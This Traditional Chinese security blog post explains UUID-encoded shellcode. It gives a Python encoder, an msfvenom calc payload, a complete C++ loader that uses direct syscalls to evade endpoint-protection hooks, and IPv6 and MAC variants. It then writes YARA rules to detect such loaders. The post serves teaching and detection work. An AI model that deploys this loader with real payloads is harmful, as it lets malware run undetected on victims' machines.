---
title: "跟端點防護軟體玩玩貓捉老鼠的遊戲 - Shellcode loader"
date: 2022-03-01
tags: [shellcode, malware, yara]
author: zet
layout: zh-tw/layouts/post.njk
image: /img/posts/zet/uuid-shellcode/uuid-in-memory.png
---

<!-- summary -->
在資安世界的紅藍對抗像極了貓捉老鼠遊戲

**紅隊** 研究新穎攻擊手法，開發新工具，繞過偵測，長期維持權限

**藍隊** 研究偵測手法，從中偵測阻擋，從偵測點串起整個攻擊鏈

今天來玩玩 malware 針對端點防護軟體會用的一些手法，做個基於 direct system call 的 uuid shellcode loader
<!-- summary -->

UUID Shellcode 早在 2017 年就有被研究員提出，在 2021 年 NCCGroup 發表了 [Lazarus APT Group](https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/) 使用 UUID Shellcode 的相關技術，之後更衍伸出 ipv6 與 mac address 格式的 shellcode

uuid 格式長得像下面這樣，中間為 `-` 分隔

```diff
c534401d-b8f0-4880-b4ee-f68bdcaa60c9
```

每個 char 都是 0-f 組成，剛好可以對應到 shellcode 的 hex

![project setup](/img/posts/zet/uuid-shellcode/uuid-format.png)

## 產生 UUID Shellcode

首先簡單使用 metasploit framework 產生測試的小算盤 shellcode 在過濾一下 null byte

```diff
msfvenom -p windows/x64/exec CMD=calc.exe -b '\x00' -f py
```

利用 python 內建的 UUID lib 產生字串

```python
import uuid
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x75\x7a\x57\xe8\x7a\x66\xe0"
buf += b"\x6d\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x89\x32\xd4\x0c\x8a\x8e\x20\x6d\x75\x7a\x16\xb9\x3b"
buf += b"\x36\xb2\x3c\x23\x32\x66\x3a\x1f\x2e\x6b\x3f\x15\x32"
buf += b"\xdc\xba\x62\x2e\x6b\x3f\x55\x32\xdc\x9a\x2a\x2e\xef"
buf += b"\xda\x3f\x30\x1a\xd9\xb3\x2e\xd1\xad\xd9\x46\x36\x94"
buf += b"\x78\x4a\xc0\x2c\xb4\xb3\x5a\xa9\x7b\xa7\x02\x80\x27"
buf += b"\x3b\x06\xa0\xf1\x34\xc0\xe6\x37\x46\x1f\xe9\xaa\xed"
buf += b"\x60\xe5\x75\x7a\x57\xa0\xff\xa6\x94\x0a\x3d\x7b\x87"
buf += b"\xb8\xf1\x2e\xf8\x29\xfe\x3a\x77\xa1\x7b\xb6\x03\x3b"
buf += b"\x3d\x85\x9e\xa9\xf1\x52\x68\x25\x74\xac\x1a\xd9\xb3"
buf += b"\x2e\xd1\xad\xd9\x3b\x96\x21\x77\x27\xe1\xac\x4d\x9a"
buf += b"\x22\x19\x36\x65\xac\x49\x7d\x3f\x6e\x39\x0f\xbe\xb8"
buf += b"\x29\xfe\x3a\x73\xa1\x7b\xb6\x86\x2c\xfe\x76\x1f\xac"
buf += b"\xf1\x26\xfc\x24\x74\xaa\x16\x63\x7e\xee\xa8\x6c\xa5"
buf += b"\x3b\x0f\xa9\x22\x38\xb9\x37\x34\x22\x16\xb1\x3b\x3c"
buf += b"\xa8\xee\x99\x5a\x16\xba\x85\x86\xb8\x2c\x2c\x20\x1f"
buf += b"\x63\x68\x8f\xb7\x92\x8a\x85\x0a\xa0\xc0\x67\xe0\x6d"
buf += b"\x75\x7a\x57\xe8\x7a\x2e\x6d\xe0\x74\x7b\x57\xe8\x3b"
buf += b"\xdc\xd1\xe6\x1a\xfd\xa8\x3d\xc1\x96\x55\xcf\x23\x3b"
buf += b"\xed\x4e\xef\xdb\x7d\x92\xa0\x32\xd4\x2c\x52\x5a\xe6"
buf += b"\x11\x7f\xfa\xac\x08\x0f\x63\x5b\x2a\x66\x08\x38\x82"
buf += b"\x7a\x3f\xa1\xe4\xaf\x85\x82\x8b\x1b\x0a\x83\x43\x10"
buf += b"\x02\x32\xe8\x7a\x66\xe0\x6d"
if len(buf)% 16 != 0:
    nop =  b"\x90" * (16-(len(buf)%16))
    buf = nop + buf
for i in range(0, len(buf), 16):
    print('"' + str(uuid.UUID(bytes_le=buf[i:i+16])) + '"')
```

產生出來的UUID會是

```diff
"c9314890-8148-dde9-ffff-ff488d05efff"
"bb48ffff-7a75-e857-7a66-e06d48315827"
...
...
```

不能對齊 16 byte 的話前面用 **nop** 填充

## 執行 Shellcode

在 NCC 發表的文章中有範例程式，看到其中使用了兩個 API `UuidFromStringA` + `EnumSystemLocalA` 來實現 shellcode 還原與執行，`UuidFromStringA` 負責把UUID 格式的字串轉為 byte code，再利用 `EnumSystemLocalA` 的 callback 特性來執行 shellcode

### Direct system calls

這邊來結合 [SysWhispers](https://github.com/jthuraisamy/SysWhispers) 製作看看 direct system calls UUID shellcode loader，SysWhispers 是基於 [Cneelis blog 文章](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/) 直接使用 syscall 可以防止 user mode hook 的 library，後來也釋出了 [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2) 參考 [MDSec Blog](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/) 中的技術使用不同的方式產生 asm code 減少大小，還可以混淆 function string

先把一些常用的 syscall export 出來，會產生出 `.h` 跟 `.asm` 檔，跟著 project README 設定一下，應該就可以正常編譯了

```shell
py .\syswhispers.py --preset common -o syscalls_common
```

![project setup](/img/posts/zet/uuid-shellcode/project-files.png)

這邊 `uuid-shellcode.cpp` 偷懶一下 就單純用一個 `NtAllocateVirtualMemory` system call 試試效果就好

```cpp
#include <Rpc.h>
#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include "syscalls_common.h"
#pragma comment(lib, "Rpcrt4.lib")
using namespace std;
const vector<string> uuids{
    "c9314890-8148-dde9-ffff-ff488d05efff",
    "bb48ffff-7a75-e857-7a66-e06d48315827",
    "fff82d48-ffff-f4e2-8932-d40c8a8e206d",
    "b9167a75-363b-3cb2-2332-663a1f2e6b3f",
    "badc3215-2e62-3f6b-5532-dc9a2a2eefda",
    "d91a303f-2eb3-add1-d946-3694784ac02c",
    "a95ab3b4-a77b-8002-273b-06a0f134c0e6",
    "e91f4637-edaa-e560-757a-57a0ffa6940a",
    "b8877b3d-2ef1-29f8-fe3a-77a17bb6033b",
    "a99e853d-52f1-2568-74ac-1ad9b32ed1ad",
    "21963bd9-2777-ace1-4d9a-22193665ac49",
    "396e3f7d-be0f-29b8-fe3a-73a17bb6862c",
    "ac1f76fe-26f1-24fc-74aa-16637eeea86c",
    "a90f3ba5-3822-37b9-3422-16b13b3ca8ee",
    "ba165a99-8685-2cb8-2c20-1f63688fb792",
    "a00a858a-67c0-6de0-757a-57e87a2e6de0",
    "e8577b74-dc3b-e6d1-1afd-a83dc19655cf",
    "4eed3b23-dbef-927d-a032-d42c525ae611",
    "08acfa7f-630f-2a5b-6608-38827a3fa1e4",
    "8b8285af-0a1b-4383-1002-32e87a66e06d",
};
int main() {
  LPVOID exec = nullptr;
  auto len = uuids.size() * 16;
  NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &len, MEM_COMMIT,
                          PAGE_EXECUTE_READWRITE);
  DWORD_PTR hptr = (DWORD_PTR)exec;
  for (auto& uuid : uuids) {
    RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuid.c_str(), (UUID*)hptr);
    if (status != RPC_S_OK) {
      return -1;
    }
    hptr += 16;
  }
  ((void (*)())exec)();
  return 0;
}
```

下斷點可以看到 `UuidFromStringA` 還原後的 shellcode 在記憶體中

![uuid decode in memory](/img/posts/zet/uuid-shellcode/uuid-in-memory.png)


![calc](/img/posts/zet/uuid-shellcode/uuid-calc.png)

更多其他利用：
- [C# Dynamic-Invoke UUID shellcode Execution](https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/)
    - [Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke & API Hooks)](https://thewover.github.io/Dynamic-Invoke/)
    - [github DInvoke](https://github.com/TheWover/DInvoke)
- [Ninja UUID Runner](https://github.com/boku7/Ninja_UUID_Runner) 利用 HellsGate syscall 減少在 User mode 被檢測的風險
- [native Windows functions for shellcode execution](http://ropgadget.com/posts/abusing_win_functions.html) 利用更多 windows native function callback 執行 shellcode
- [Callback_Shellcode_Injection](https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection)
- [x86 SysWhispers2](https://github.com/mai1zhi2/SysWhispers2_x86) 支援 x86 的 SysWhispers2 (SysWhispers 只支援 64)
- [SysWhispers Shellcode Loader](https://github.com/icyguider/Shhhloader)
- [MALWARE ANALYSIS: SYSCALLS](https://jmpesp.me/malware-analysis-syscalls-example/) 如何 debug 分析 direct syscall 的 malware


更多其他 shellcode 格式 可以參考 [Midi Wan github](https://github.com/midisec/BypassAnti-Virus/tree/main/callback):

ipv6 format

```diff
"fc48:83e4:f0e8:c800:0:4151:4150:5251"
"5648:31d2:6548:8b52:6048:8b52:1848:8b52"
"2048:8b72:5048:fb7:4a4a:4d31:c948:31c0"
"ac3c:617c:22c:2041:c1c9:d41:1c1:e2ed"
```

mac address format

```diff
"FC-48-83-E4-F0-E8",
"C8-00-00-00-41-51",
"41-50-52-51-56-48",
"31-D2-65-48-8B-52",
"60-48-8B-52-18-48",
"8B-52-20-48-8B-72"
```

## 偵測



利用 yara 寫些 patten，針對 POC 中主要使用的 API `UuidFromString`  加上 超過一定數量 UUID 的特徵簡單寫個 yara rule，也可以再加上 API `HeapAlloc` + `EnumSystemLocales`

簡單的範例大概如下：

```yml
rule uuid_shellcode_loader {
    meta:
        description = "shellcode through UUID"
        date = "02/16/2022"
        author = "Zet"
    strings:
        $mz = "MZ"
        $a = "UuidFromString"
        $uuid = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/ ascii
    condition:
		$mz at 0
        and $a
        and (#uuid >7)
}
```

另外針對 syswhispers2 lib 我們可以針對產生出來的 ASM 檔寫一些規則，假如要在通用一點的話或許可以在研究 lib 中用於產生 `.h` `.c` 的 [base template](https://github.com/jthuraisamy/SysWhispers2/tree/main/data) 寫規則

```yml
rule syswhispers2 {
    meta:
        description = "syswhispers2 - direct system calls lib"
        date = "02/16/2022"
        author = "Zet"
    /*
    0x140002370 48894C2408                    mov qword ptr [rsp + 8], rcx
    0x140002375 4889542410                    mov qword ptr [rsp + 0x10], rdx
    0x14000237a 4C89442418                    mov qword ptr [rsp + 0x18], r8
    0x14000237f 4C894C2420                    mov qword ptr [rsp + 0x20], r9
    0x140002384 4883EC28                      sub rsp, 0x28
    0x140002388 B91EC995DD                    mov ecx, 0xdd95c91e
    0x14000238d E85EF1FFFF                    call 0x1400014f0
    0x140002392 4883C428                      add rsp, 0x28
    0x140002396 488B4C2408                    mov rcx, qword ptr [rsp + 8]
    0x14000239b 488B542410                    mov rdx, qword ptr [rsp + 0x10]
    0x1400023a0 4C8B442418                    mov r8, qword ptr [rsp + 0x18]
    0x1400023a5 4C8B4C2420                    mov r9, qword ptr [rsp + 0x20]
    0x1400023aa 4C8BD1                        mov r10, rcx
    0x1400023ad 0F05                          syscall
    0x1400023af C3                            ret
    */
    strings:
        $mz = "MZ"
        $s = {
            48 89 4C 24 08
            48 89 54 24 10
            4C 89 44 24 18
            4C 89 4C 24 20
            48 83 EC 28
            B9 ?? ?? ?? ??
            E8 ?? ?? ?? ??
            48 83 C4 28
            48 8B 4C 24 08
            48 8B 54 24 10
            4C 8B 44 24 18
            4C 8B 4C 24 20
            4C 8B D1
            0f 05
            c3
        }
    condition:
        $mz at 0
        and #s > 3
}
```


我們可以把 yara 上傳到 [Yara Scan Service
](https://riskmitigation.ch/yara-scan/index.html) 找到一些相關手法的利用

![hunt](/img/posts/zet/uuid-shellcode/hunt.png)

## References
- https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala
- https://lowery.tech/building-a-custom-shellcode-loader-with-syswhispers-to-utilise-direct-syscalls/
- https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/
- https://captmeelo.com/redteam/maldev/2021/11/18/av-evasion-syswhisper.html
- https://github.com/am0nsec/HellsGate
